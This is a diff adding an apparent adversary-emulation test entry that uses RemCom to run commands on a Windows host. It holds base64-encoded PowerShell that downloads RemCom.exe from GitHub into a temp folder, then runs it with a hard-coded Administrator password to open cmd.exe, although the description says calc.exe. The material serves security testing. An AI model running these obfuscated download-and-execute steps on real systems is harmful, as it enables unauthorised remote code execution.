@@ -1,0 +1,20 @@
+- id: b0283c23-6dc2-5eda-a3c3-8767d1b8eef6
+  name: Soumaia ART Tests - Use RemCom to execute a command on a remote host
+  description: 'Requires having RemCom installed, path to RemCom is one of the input input_arguments
+
+    Will start a process on a remote host.
+
+    Upon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).'
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: 'System Services: Service Execution'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXAByAGUAbQBjAG8AbQAuAGUAeABlACIAKQAgAHsAIABlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGsAYQB2AGkAawBhADEAMwAvAFIAZQBtAEMAbwBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGIAaQBuAC8AUgBlAGwAZQBhAHMAZQAvAFIAZQBtAEMAbwBtAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXAByAGUAbQBjAG8AbQAuAGUAeABlACIACgA=
+          )
+          "%TEMP%\ART-ExternalPayloads\remcom.exe" \\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe
